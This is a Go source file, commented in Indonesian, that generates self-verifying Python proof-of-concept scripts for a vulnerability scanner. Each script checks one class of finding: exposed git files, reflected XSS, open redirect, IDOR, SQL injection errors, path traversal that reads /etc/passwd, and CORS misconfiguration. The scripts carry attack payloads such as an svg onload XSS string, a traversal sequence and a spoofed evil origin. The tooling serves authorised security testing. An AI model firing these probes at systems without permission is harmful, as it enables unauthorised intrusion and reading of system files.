// Package poc menghasilkan PoC script self-verifying (poc.py) per finding.
// Kontrak exit code: 0=confirmed TP, 2=false positive, 3=inconclusive, 4=blocked.
// Lihat docs/10-POC-VALIDATION.md.
package poc

import (
	"fmt"
	"strings"
)

// Generate membuat isi poc.py untuk kelas finding yang didukung.
// PoC selalu read-only, memakai payload marker jinak, dan mencetak verdict sendiri.
func Generate(class, targetURL string) (string, bool) {
	switch class {
	case "exposure":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - Exposed file (dihasilkan xyland)
Target : %s
Safety : Level 0/1 read-only. Jalankan hanya pada target berizin & in-scope.
Exit   : 0=confirmed TP | 2=false positive | 3=inconclusive
"""
import sys, urllib.request, urllib.error

URL = %q
MARKERS = ["[core]", "ref: refs/", "repositoryformatversion"]

def fetch(u):
    try:
        req = urllib.request.Request(u, headers={"User-Agent": "xyland-poc"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception:
        return None, ""

def main():
    hits = 0
    for _ in range(2):
        st, body = fetch(URL)
        if st is None:
            print("VERDICT: INCONCLUSIVE"); return 3
        if st == 200 and any(m in body for m in MARKERS):
            hits += 1
    base = URL.rsplit("/", 2)[0] + "/xyland-baseline-nonexistent"
    _, bbody = fetch(base)
    if hits == 2 and not any(m in bbody for m in MARKERS):
        print("VERDICT: CONFIRMED_TRUE_POSITIVE"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "xss-reflected":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - Reflected XSS (dihasilkan xyland) - payload marker non-destruktif.
CATATAN: konfirmasi akhir kelas ini wajib executor browser (DOM execution).
Target : %s
Exit   : 0=refleksi tanpa encoding terkonfirmasi (likely TP) | 2=FP | 3=inconclusive
"""
import sys, urllib.request, urllib.parse, urllib.error

URL = %q
PAYLOAD = "xyland<svg/onload=1>"

def fetch(u):
    try:
        req = urllib.request.Request(u, headers={"User-Agent": "xyland-poc"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode("utf-8", "ignore")
    except Exception:
        return None

def with_param(u, v):
    p = urllib.parse.urlparse(u)
    q = urllib.parse.parse_qs(p.query)
    if not q: return u
    k = next(iter(q)); q[k] = [v]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))

def main():
    ok = 0
    for _ in range(2):
        body = fetch(with_param(URL, PAYLOAD))
        if body is None:
            print("VERDICT: INCONCLUSIVE"); return 3
        if PAYLOAD in body: ok += 1
    if ok == 2:
        print("VERDICT: REFLECTED_UNENCODED (validasi browser untuk konfirmasi DOM)"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "open-redirect":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - Open Redirect (dihasilkan xyland) - marker domain milik penguji.
Target : %s
Exit   : 0=confirmed TP | 2=false positive | 3=inconclusive
"""
import urllib.request, urllib.parse

URL = %q
MARKER = "https://marker.xyland.invalid/"

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k): return None

def location(u):
    try:
        req = urllib.request.Request(u, headers={"User-Agent": "xyland-poc"})
        urllib.request.build_opener(NoRedirect).open(req, timeout=10)
        return None
    except urllib.error.HTTPError as e:
        return e.headers.get("Location")
    except Exception:
        return "ERR"

def with_param(u, v):
    p = urllib.parse.urlparse(u)
    q = urllib.parse.parse_qs(p.query)
    for k in q:
        if k.lower() in ("next","url","redirect","return","target","dest"):
            q[k] = [v]; break
    else:
        if q: q[next(iter(q))] = [v]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))

def main():
    loc = location(with_param(URL, MARKER))
    if loc == "ERR":
        print("VERDICT: INCONCLUSIVE"); return 3
    if loc and loc.startswith(MARKER):
        print("VERDICT: CONFIRMED_TRUE_POSITIVE"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "idor":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - IDOR / Broken Access Control (dihasilkan xyland)
Sesi dibaca dari ENV (tidak ada kredensial di file ini):
  XYLAND_COOKIE_A="session=..." XYLAND_COOKIE_B="session=..." python3 poc.py
Target : %s
Exit   : 0=confirmed (B membaca objek A) | 2=false positive | 3=inconclusive
"""
import os, urllib.request, urllib.error

URL = %q

def fetch(u, cookie):
    try:
        req = urllib.request.Request(u, headers={"Cookie": cookie, "User-Agent": "xyland-poc"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception:
        return None, ""

def main():
    a = os.environ.get("XYLAND_COOKIE_A"); b = os.environ.get("XYLAND_COOKIE_B")
    if not a or not b:
        print("VERDICT: INCONCLUSIVE (env sesi belum diisi)"); return 3
    sa, own = fetch(URL, a)
    sb, cross = fetch(URL, b)
    if sa != 200 or sb != 200 or not own:
        print("VERDICT: INCONCLUSIVE"); return 3
    if own.strip() == cross.strip():
        print("VERDICT: CONFIRMED (sesi B membaca objek sesi A)"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "sqli":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - SQL Injection DETEKSI (dihasilkan xyland) - error-based saja, TIDAK mengekstrak data.
Target : %s
Exit   : 0=error SQL terkonfirmasi | 2=false positive | 3=inconclusive
"""
import urllib.request, urllib.parse, urllib.error

URL = %q
ERRS = ["sql syntax","you have an error in your sql","sqlite","sqlstate","ora-0","syntax error at or near"]

def fetch(u):
    try:
        req = urllib.request.Request(u, headers={"User-Agent":"xyland-poc"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8","ignore")
    except Exception:
        return None

def withq(u, suffix):
    p = urllib.parse.urlparse(u); q = urllib.parse.parse_qs(p.query)
    if not q: return u
    k = next(iter(q)); q[k] = [q[k][0] + suffix]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))

def has_err(body):
    lb = (body or "").lower()
    return any(e in lb for e in ERRS)

def main():
    base = fetch(URL)
    if base is None: print("VERDICT: INCONCLUSIVE"); return 3
    hits = sum(1 for _ in range(2) if has_err(fetch(withq(URL, "'"))))
    if hits == 2 and not has_err(base):
        print("VERDICT: CONFIRMED (error-based, deteksi saja)"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "path-traversal":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - Path Traversal (dihasilkan xyland) - membaca /etc/passwd sebagai bukti (file publik-aman).
Target : %s
Exit   : 0=confirmed TP | 2=false positive | 3=inconclusive
"""
import urllib.request, urllib.parse, urllib.error

URL = %q

def fetch(u):
    try:
        req = urllib.request.Request(u, headers={"User-Agent":"xyland-poc"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode("utf-8","ignore")
    except Exception:
        return None

def witht(u):
    p = urllib.parse.urlparse(u); q = urllib.parse.parse_qs(p.query)
    keys = [k for k in q if k.lower() in ("file","path","page","template","doc","include","filename","dir","view","name")]
    if not q: return u
    k = keys[0] if keys else next(iter(q)); q[k] = ["../../../../etc/passwd"]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))

def main():
    hits = 0
    for _ in range(2):
        b = fetch(witht(URL))
        if b is None: print("VERDICT: INCONCLUSIVE"); return 3
        if "root:x:0:0:" in b: hits += 1
    if hits == 2: print("VERDICT: CONFIRMED_TRUE_POSITIVE"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "cors":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - CORS Misconfiguration (dihasilkan xyland)
Target : %s
Exit   : 0=refleksi berkredensial terkonfirmasi | 2=false positive | 3=inconclusive
"""
import urllib.request

URL = %q
ORIGIN = "https://evil.xyland.invalid"

def main():
    try:
        req = urllib.request.Request(URL, headers={"Origin": ORIGIN, "User-Agent":"xyland-poc"})
        with urllib.request.urlopen(req, timeout=10) as r:
            acao = r.headers.get("Access-Control-Allow-Origin")
            acac = (r.headers.get("Access-Control-Allow-Credentials") or "").lower()
    except Exception:
        print("VERDICT: INCONCLUSIVE"); return 3
    if acao == ORIGIN and acac == "true":
        print("VERDICT: CONFIRMED (origin dipantulkan + kredensial)"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true
	}
	return "", false
}

var _ = strings.TrimSpace
